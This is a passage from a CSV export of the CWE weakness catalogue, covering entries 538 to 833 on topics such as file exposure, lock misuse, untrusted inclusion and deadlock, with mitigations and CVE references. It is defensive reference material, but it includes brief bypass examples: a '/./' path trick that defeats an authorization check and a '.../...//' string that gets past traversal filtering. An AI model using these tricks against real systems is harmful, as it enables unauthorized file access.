Design:DESCRIPTION:Protect information stored in cache.::PHASE:Architecture and Design:DESCRIPTION:Do not store unnecessarily sensitive information in the cache.::PHASE:Architecture and Design:DESCRIPTION:Consider using encryption in the cache.::\",\"\",,,\"\",::204::,\"\",\n538,\"Insertion of Sensitive Information into Externally-Accessible File or Directory\",Base,Draft,\"The product places sensitive information into files or directories that are accessible to actors who are allowed to have access to the files, but not to the sensitive information.\",\"\",::NATURE:ChildOf:CWE ID:200:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.::PHASE:Operation:NOTE:OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Files or Directories::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design Operation System Configuration:DESCRIPTION:Do not expose file and directory information to the user.::\",\"::REFERENCE:CVE-2018-1999036:DESCRIPTION:SSH password for private key stored in build log:LINK:https://www.cve.org/CVERecord?id=CVE-2018-1999036::\",,,\"\",::95::,\"::TYPE:Maintenance:NOTE:Depending on usage, this could be a weakness or a category. Further study of all its children is needed, and the entire sub-tree may need to be clarified. The current organization is based primarily on the exposure of sensitive information as a consequence, instead of as a primary weakness.::TYPE:Maintenance:NOTE:There is a close relationship with CWE-552, which is more focused on weaknesses. As a result, it may be more appropriate to convert CWE-538 to a category.::\",\n544,\"Missing Standardized Error Handling Mechanism\",Base,Draft,\"The product does not use a standardized method for handling errors throughout the code, which might introduce inconsistent error handling and resultant weaknesses.\",\"If the product handles error messages individually, on a one-by-one basis, this is likely to result in inconsistent error handling. The causes of errors may be lost. Also, detailed information about the causes of an error may be unintentionally returned to the user.\",::NATURE:ChildOf:CWE ID:755:VIEW ID:1000:ORDINAL:Primary::,\"\",,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.::\",\"\",,\"::SCOPE:Integrity:SCOPE:Other:IMPACT:Quality Degradation:IMPACT:Unexpected State:IMPACT:Varies by Context::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:define a strategy for handling errors of different severities, such as fatal errors versus basic log events. Use or create built-in language features, or an external package, that provides an easy-to-use API and define coding standards for the detection and handling of errors.::\",\"\",,,\"::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:ERR00-C:ENTRY NAME:Adopt and implement a consistent and comprehensive error-handling policy::\",,\"\",\n547,\"Use of Hard-coded, Security-relevant Constants\",Base,Draft,\"The product uses hard-coded constants instead of symbolic names for security-critical values, which increases the likelihood of mistakes during code maintenance or security policy change.\",\"If the developer does not find all occurrences of the hard-coded constants, an incorrect policy decision may be made if one of the constants is not changed. Making changes to these values will require code changes that may be difficult or impossible once the system is released to the field. In addition, these hard-coded values may become available to attackers if the code is ever disclosed.\",::NATURE:ChildOf:CWE ID:1078:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Varies by Context:IMPACT:Quality Degradation:NOTE:The existence of hardcoded constants could cause unexpected behavior and the introduction of weaknesses during code maintenance or when making changes to the code if all occurrences are not modified. The use of hardcoded constants is an indication of poor quality.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:Avoid using hard-coded constants. Configuration files offer a more flexible solution.::\",\"\",,,\"::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:DCL06-C:ENTRY NAME:Use meaningful symbolic constants to represent literal values in program logic::\",,\"\",\n549,\"Missing Password Field Masking\",Base,Draft,\"The product does not mask passwords during entry, increasing the potential for attackers to observe and capture passwords.\",\"\",::NATURE:ChildOf:CWE ID:522:VIEW ID:1000:ORDINAL:Primary::,\"\",,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation Requirements:DESCRIPTION:Recommendations include requiring all password fields in your web application be masked to prevent other users from seeing this information.::\",\"\",,,\"\",,\"\",\n551,\"Incorrect Behavior Order: Authorization Before Parsing and Canonicalization\",Base,Incomplete,\"If a web server does not fully parse requested URLs before it examines them for authorization, it may be possible for an attacker to bypass authorization protection.\",\"For instance, the character strings /./ and / both mean current directory. If /SomeDirectory is a protected directory and an attacker requests /./SomeDirectory, the attacker may be able to gain access to the resource if /./ is not converted to / before the authorization check is performed.\",::NATURE:ChildOf:CWE ID:863:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:696:VIEW ID:1000::,\"\",,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:URL Inputs should be decoded and canonicalized to the application's current internal representation before being validated and processed for authorization. Make sure that your application does not decode the same input twice. Such errors could be used to bypass allowlist schemes by introducing dangerous inputs after they have been checked.::\",\"\",,,\"\",,\"\",\n552,\"Files or Directories Accessible to External Parties\",Base,Draft,\"The product makes files or directories accessible to unauthorized actors, even though they should not be.\",\"Web servers, FTP servers, and similar servers may store a set of files underneath a root directory that is accessible to the server's users. Applications may store sensitive files underneath this root without also using access control to limit which users may request those files, if any. Alternately, an application might package multiple files or directories into an archive file (e.g., ZIP or tar), but the application might not exclude sensitive files that are underneath those directories. In cloud technologies and containers, this weakness might present itself in the form of misconfigured storage accounts that can be read or written by a public or anonymous user.\",::NATURE:ChildOf:CWE ID:668:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:668:VIEW ID:1003:ORDINAL:Primary::NATURE:ChildOf:CWE ID:285:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:Cloud Computing:TECHNOLOGY PREVALENCE:Often::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.::PHASE:Operation:NOTE:OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation System Configuration Operation:DESCRIPTION:When storing data in the cloud (e.g., S3 buckets, Azure blobs, Google Cloud Storage, etc.), use the provider's controls to disable public access.::\",\"::REFERENCE:CVE-2005-1835:DESCRIPTION:Data file under web root.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1835::\",,::File or Directory::,\"::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A10:ENTRY NAME:Insecure Configuration Management:MAPPING FIT:CWE More Specific::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:FIO15-C:ENTRY NAME:Ensure that file operations are performed in a secure directory::\",::150::639::,\"\",\n764,\"Multiple Locks of a Critical Resource\",Base,Incomplete,\"The product locks a critical resource more times than intended, leading to an unexpected state in the system.\",\"When a product is operating in a concurrent environment and repeatedly locks a critical resource, the consequences will vary based on the type of lock, the lock's implementation, and the resource being protected. In some situations such as with semaphores, the resources are pooled and extra locking calls will reduce the size of the total available pool, possibly leading to degraded performance or a denial of service. If this can be triggered by an attacker, it will be similar to an unrestricted lock (CWE-412). In the context of a binary lock, it is likely that any duplicate locking attempts will never succeed since the lock is already held and progress may not be possible.\",::NATURE:ChildOf:CWE ID:667:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:675:VIEW ID:1000::NATURE:ChildOf:CWE ID:662:VIEW ID:1305:ORDINAL:Primary::NATURE:ChildOf:CWE ID:662:VIEW ID:1340:ORDINAL:Primary::,\"\",,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Availability:SCOPE:Integrity:IMPACT:DoS: Resource Consumption (CPU):IMPACT:DoS: Crash, Exit, or Restart:IMPACT:Unexpected State::\",\"\",\"::PHASE:Implementation:DESCRIPTION:When locking and unlocking a resource, try to be sure that all control paths through the code in which the resource is locked one or more times correspond to exactly as many unlocks. If the software acquires a lock and then determines it is not able to perform its intended behavior, be sure to release the lock(s) before waiting for conditions to improve. Reacquire the lock(s) before trying again.::\",\"\",,,\"::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP21:ENTRY NAME:Multiple locks/unlocks::\",,\"::TYPE:Maintenance:NOTE:An alternate way to think about this weakness is as an imbalance between the number of locks / unlocks in the control flow. Over the course of execution, if each lock call is not followed by a subsequent call to unlock in a reasonable amount of time, then system performance may be degraded or at least operating at less than peak levels if there is competition for the locks. This entry may need to be modified to reflect these concepts in the future.::\",\n765,\"Multiple Unlocks of a Critical Resource\",Base,Incomplete,\"The product unlocks a critical resource more times than intended, leading to an unexpected state in the system.\",\"When the product is operating in a concurrent environment and repeatedly unlocks a critical resource, the consequences will vary based on the type of lock, the lock's implementation, and the resource being protected. In some situations such as with semaphores, the resources are pooled and extra calls to unlock will increase the count for the number of available resources, likely resulting in a crash or unpredictable behavior when the system nears capacity.\",::NATURE:ChildOf:CWE ID:667:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:675:VIEW ID:1000::,\"\",,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Availability:SCOPE:Integrity:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:Modify Memory:IMPACT:Unexpected State::\",\"\",\"::PHASE:Implementation:DESCRIPTION:When locking and unlocking a resource, try to be sure that all control paths through the code in which the resource is locked one or more times correspond to exactly as many unlocks. If the product acquires a lock and then determines it is not able to perform its intended behavior, be sure to release the lock(s) before waiting for conditions to improve. Reacquire the lock(s) before trying again.::\",\"::REFERENCE:CVE-2009-0935:DESCRIPTION:Attacker provides invalid address to a memory-reading function, causing a mutex to be unlocked twice:LINK:https://www.cve.org/CVERecord?id=CVE-2009-0935::\",,,\"::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP21:ENTRY NAME:Multiple locks/unlocks::\",,\"::TYPE:Maintenance:NOTE:An alternate way to think about this weakness is as an imbalance between the number of locks / unlocks in the control flow. Over the course of execution, if each lock call is not followed by a subsequent call to unlock in a reasonable amount of time, then system performance may be degraded or at least operating at less than peak levels if there is competition for the locks. This entry may need to be modified to reflect these concepts in the future.::\",\n766,\"Critical Data Element Declared Public\",Base,Incomplete,\"The product declares a critical variable, field, or member to be public when intended security policy requires it to be private.\",\"This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\",::NATURE:ChildOf:CWE ID:732:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:1061:VIEW ID:1000::,\"::ORDINALITY:Primary::ORDINALITY:Indirect::\",::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C#:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Confidentiality:IMPACT:Read Application Data:IMPACT:Modify Application Data:NOTE:Making a critical variable public allows anyone with access to the object in which the variable is contained to alter or read the value.::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:Data should be private, static, and final whenever possible. This will assure that your code is protected by instantiating early, preventing access, and preventing tampering.::\",\"::REFERENCE:CVE-2010-3860:DESCRIPTION:variables declared public allow remote read of system properties such as user name and home directory.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-3860::\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Failure to protect stored data from modification::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:OBJ01-J:ENTRY NAME:Declare data members as private and provide accessible wrapper methods::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP28:ENTRY NAME:Unexpected access points::TAXONOMY NAME:OMG ASCMM:ENTRY ID:ASCMM-MNT-15::\",,\"\",\n767,\"Access to Critical Private Variable via Public Method\",Base,Incomplete,\"The product defines a public method that reads or modifies a private variable.\",\"If an attacker modifies the variable to contain unexpected values, this could violate assumptions from other parts of the code. Additionally, if an attacker can read the private variable, it may expose sensitive information or make it easier to launch further attacks.\",::NATURE:ChildOf:CWE ID:668:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C#:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Other:IMPACT:Modify Application Data:IMPACT:Other::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Use class accessor and mutator methods appropriately. Perform validation when accepting data from a public method that is intended to modify a critical private variable. Also be sure that appropriate access controls are being applied when a public method interfaces with critical data.::\",\"\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Failure to protect stored data from modification::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP23:ENTRY NAME:Exposed Data::TAXONOMY NAME:SEI CERT Perl Coding Standard:ENTRY ID:OOP31-PL:ENTRY NAME:Do not access private variables or subroutines in other packages:MAPPING FIT:Imprecise::\",,\"::TYPE:Maintenance:NOTE:This entry is closely associated with access control for public methods. If the public methods are restricted with proper access controls, then the information in the private variable will not be exposed to unexpected parties. There may be chaining or composite relationships between improper access controls and this weakness.::\",\n829,\"Inclusion of Functionality from Untrusted Control Sphere\",Base,Incomplete,\"The product imports, requires, or includes executable functionality (such as a library) from a source that is outside of the intended control sphere.\",\"When including third-party functionality, such as a web widget, library, or other source of functionality, the product must effectively trust that functionality. Without sufficient protection mechanisms, the functionality could be malicious in nature (either by coming from an untrusted source, being spoofed, or being modified in transit from a trusted source). The functionality might also contain its own weaknesses, or grant access to additional functionality and state information that should be kept private to the base system, such as system state information, sensitive application data, or the DOM of a web application. This might lead to many different consequences depending on the included functionality, but some examples include injection of malware, information exposure by granting excessive privileges or permissions to the untrusted functionality, DOM-based XSS vulnerabilities, stealing user's cookies, or open redirect to malware (CWE-601).\",::NATURE:ChildOf:CWE ID:669:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:669:VIEW ID:1003:ORDINAL:Primary::,\"\",,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:IMPACT:Execute Unauthorized Code or Commands:NOTE:An attacker could insert malicious functionality into the program by causing the program to download code that the attacker has placed into the untrusted control sphere, such as a malicious web site.::\",\"::METHOD:Automated Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Bytecode Weakness Analysis - including disassembler + source code weakness analysis:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Forced Path Execution Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Manual Source Code Review (not inspections) Cost effective for partial coverage: Focused Manual Spotcheck - Focused manual analysis of source:EFFECTIVENESS:High::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer:EFFECTIVENESS:SOAR Partial::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.) Formal Methods / Correct-By-Construction Cost effective for partial coverage: Attack Modeling:EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.::PHASE:Architecture and Design:STRATEGY:Enforcement by Conversion:DESCRIPTION:When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs. For example, ID 1 could map to inbox.txt and ID 2 could map to profile.txt. Features such as the ESAPI AccessReferenceMap [REF-45] provide this capability.::PHASE:Architecture and Design:DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.::PHASE:Architecture and Design Operation:STRATEGY:Sandbox or Jail:DESCRIPTION:Run the code in a jail or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software. OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations. This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise. Be careful to avoid CWE-243 and other weaknesses related to jails.:EFFECTIVENESS:Limited::PHASE:Architecture and Design Operation:STRATEGY:Environment Hardening:DESCRIPTION:Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single . character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as / to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434. Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering / is insufficient protection if the filesystem also supports the use of as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ../ sequences are removed from the .../...// string in a sequential fashion, two instances of ../ would be removed from the original string, but the remaining characters would still form the ../ string.:EFFECTIVENESS:High::PHASE:Architecture and Design Operation:STRATEGY:Attack Surface Reduction:DESCRIPTION:Store library, include, and utility files outside of the web document root, if possible. Otherwise, store them in a separate directory and use the web server's access control capabilities to prevent attackers from directly requesting them. One common practice is to define a fixed constant in each calling program, then check for the existence of the constant in the library/include file; if the constant does not exist, then the file was directly requested, and it can exit immediately. This significantly reduces the chance of an attacker being able to bypass any protection mechanisms that are in the base program but not in the include files. It will also reduce the attack surface.::PHASE:Architecture and Design Implementation:STRATEGY:Attack Surface Reduction:DESCRIPTION:Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls. Many file inclusion problems occur because the programmer assumed that certain inputs could not be modified, especially for cookies and URL components.::PHASE:Operation:STRATEGY:Firewall:DESCRIPTION:Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.:EFFECTIVENESS:Moderate::\",\"::REFERENCE:CVE-2010-2076:DESCRIPTION:Product does not properly reject DTDs in SOAP messages, which allows remote attackers to read arbitrary files, send HTTP requests to intranet servers, or cause a denial of service.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-2076::REFERENCE:CVE-2004-0285:DESCRIPTION:Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0285::REFERENCE:CVE-2004-0030:DESCRIPTION:Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0030::REFERENCE:CVE-2004-0068:DESCRIPTION:Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0068::REFERENCE:CVE-2005-2157:DESCRIPTION:Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2157::REFERENCE:CVE-2005-2162:DESCRIPTION:Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2162::REFERENCE:CVE-2005-2198:DESCRIPTION:Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2198::REFERENCE:CVE-2004-0128:DESCRIPTION:Modification of assumed-immutable variable in configuration script leads to file inclusion.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0128::REFERENCE:CVE-2005-1864:DESCRIPTION:PHP file inclusion.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1864::REFERENCE:CVE-2005-1869:DESCRIPTION:PHP file inclusion.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1869::REFERENCE:CVE-2005-1870:DESCRIPTION:PHP file inclusion.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1870::REFERENCE:CVE-2005-2154:DESCRIPTION:PHP local file inclusion.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2154::REFERENCE:CVE-2002-1704:DESCRIPTION:PHP remote file include.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1704::REFERENCE:CVE-2002-1707:DESCRIPTION:PHP remote file include.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1707::REFERENCE:CVE-2005-1964:DESCRIPTION:PHP remote file include.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1964::REFERENCE:CVE-2005-1681:DESCRIPTION:PHP remote file include.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1681::REFERENCE:CVE-2005-2086:DESCRIPTION:PHP remote file include.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2086::REFERENCE:CVE-2004-0127:DESCRIPTION:Directory traversal vulnerability in PHP include statement.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0127::REFERENCE:CVE-2005-1971:DESCRIPTION:Directory traversal vulnerability in PHP include statement.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1971::REFERENCE:CVE-2005-3335:DESCRIPTION:PHP file inclusion issue, both remote and local; local include uses .. and %00 characters as a manipulation, but many remote file inclusion issues probably have this vector.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-3335::\",,,\"\",::175::201::228::251::252::253::263::538::549::640::660::695::698::,\"\",\n832,\"Unlock of a Resource that is not Locked\",Base,Incomplete,\"The product attempts to unlock a resource that is not locked.\",\"Depending on the locking functionality, an unlock of a non-locked resource might cause memory corruption or other modification to the resource (or its associated metadata that is used for tracking locks).\",::NATURE:ChildOf:CWE ID:667:VIEW ID:1000:ORDINAL:Primary::,\"\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:SCOPE:Other:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Modify Memory:IMPACT:Other:NOTE:Depending on the locking being used, an unlock operation might not have any adverse effects. When effects exist, the most common consequence will be a corruption of the state of the product, possibly leading to a crash or exit; depending on the implementation of the unlocking, memory corruption or code execution could occur.::\",\"\",\"\",\"::REFERENCE:CVE-2010-4210:DESCRIPTION:function in OS kernel unlocks a mutex that was not previously locked, causing a panic or overwrite of arbitrary memory.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-4210::REFERENCE:CVE-2008-4302:DESCRIPTION:Chain: OS kernel does not properly handle a failure of a function call (CWE-755), leading to an unlock of a resource that was not locked (CWE-832), with resultant crash.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-4302::REFERENCE:CVE-2009-1243:DESCRIPTION:OS kernel performs an unlock in some incorrect circumstances, leading to panic.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-1243::\",,,\"\",,\"\",\n833,\"Deadlock\",Base,Incomplete,\"The product contains multiple threads or executable segments that are waiting for each other to release a necessary lock, resulting in deadlock.\",\"\",::NATURE:ChildOf:CWE ID:667:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:662:VIEW ID:1305:ORDINAL:Primary::,\"\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Availability:IMPACT:DoS: Resource Consumption (CPU):IMPACT:DoS: Resource Consumption (Other):IMPACT:DoS: Crash, Exit, or Restart:NOTE:Each thread of execution will hang and prevent tasks from completing. In some cases, CPU consumption may occur if a lock check occurs in a tight loop.::\",\"\",\"\",\"::REFERENCE:CVE-1999-1476:DESCRIPTION:A bug in some Intel Pentium processors allow DoS (hang) via an invalid CMPXCHG8B instruction, causing a deadlock:LINK:https://www.cve.org/CVERecord?id=CVE-1999-1476::REFERENCE:CVE-2009-2857:DESCRIPTION:OS deadlock:LINK:https://www.cve.org/CVERecord?id=CVE-2009-2857::REFERENCE:CVE-2009-1961:DESCRIPTION:OS deadlock involving 3 separate functions:LINK:https://www.cve.org/CVERecord?id=CVE-2009-1961::REFERENCE:CVE-2009-2699:DESCRIPTION:deadlock in library:LINK:https://www.cve.org/CVERecord?id=CVE-2009-2699::REFERENCE:CVE-2009-4272:DESCRIPTION:deadlock triggered by packets that force collisions in a routing table:LINK:https://www.cve.org/CVERecord?id=CVE-2009-4272::REFERENCE:CVE-2002-1850:DESCRIPTION:read/write deadlock between web server and script:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1850::REFERENCE:CVE-2004-0174:DESCRIPTION:web server deadlock involving multiple listening connections:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0174::REFERENCE:CVE-2009-1388:DESCRIPTION:multiple simultaneous calls to the same function trigger deadlock.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-1388::REFERENCE:CVE-2006-5158:DESCRIPTION:chain: other weakness leads to NULL pointer dereference (CWE-476) or deadlock (CWE-833).:LINK:https://www.cve.org/CVERecord?id=CVE-2006-5158::REFERENCE:CVE-2006-4342:DESCRIPTION:deadlock when an operation is performed on a resource while it is being removed.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-4342::REFERENCE:CVE-2006-2374:DESCRIPTION:Deadlock in device driver triggered by using file handle of a related device.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-2374::REFERENCE:CVE-2006-2275:DESCRIPTION:Deadlock when large number of small messages cannot be processed quickly enough.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-2275::REFERENCE:CVE-2005-3847:DESCRIPTION:OS kernel has deadlock triggered by a signal during a core dump.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-3847::REFERENCE:CVE-2005-3106:DESCRIPTION:Race condition leads to 